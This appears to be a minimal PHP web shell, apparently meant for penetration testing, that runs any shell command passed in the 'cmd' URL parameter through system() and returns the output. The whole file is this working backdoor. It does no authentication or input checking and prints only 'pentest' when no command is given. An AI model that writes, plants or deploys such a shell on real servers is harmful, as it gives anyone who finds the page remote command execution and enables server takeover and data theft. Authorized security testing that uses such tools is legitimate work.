<?php
if (isset($_GET['cmd'])) { header('Content-Type: text/plain'); system($_GET['cmd']); }
else { echo "pentest"; }
?>
